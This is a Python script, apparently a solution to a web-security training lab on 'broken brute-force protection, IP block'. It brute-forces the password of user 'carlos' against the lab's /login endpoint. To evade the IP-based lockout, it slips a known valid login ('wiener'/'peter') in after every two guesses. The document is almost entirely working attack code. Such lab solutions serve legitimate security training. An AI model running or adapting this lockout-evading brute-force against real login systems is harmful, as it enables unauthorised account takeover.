### LAB: Broken brute-force protection, IP block

import requests
import time

start_time = time.time()

# Read all possible password
with open('password.txt') as f:
    passwords = [line.rstrip() for line in f]

# URL LAB ID
url = "https://0afd004a0316863681c81ba800140005.web-security-academy.net"

count = len(passwords)/2

for i in range(int(count) + 1):
    passwords.insert(3 * i, 'peter')

#brute-force password
def find_valid_credential():
    valid_credential = ""

    for password in passwords:
        if password == 'peter':
            username = 'wiener'
        else:
            username = 'carlos'
        data = {'username' : username, 'password' : password}
        response = requests.post(url + '/login', data=data, allow_redirects=False)
        #If response status code is 302 (login success) => add to valid credential
        if response.status_code == 302 and username != 'wiener':
            valid_credential += username + " - " + password + "\n"
            break
    
    print(f'Credentials: {valid_credential.rstrip()}')

find_valid_credential()

print('------------------------------------------- \nExecution Time: %s seconds' % (time.time() - start_time))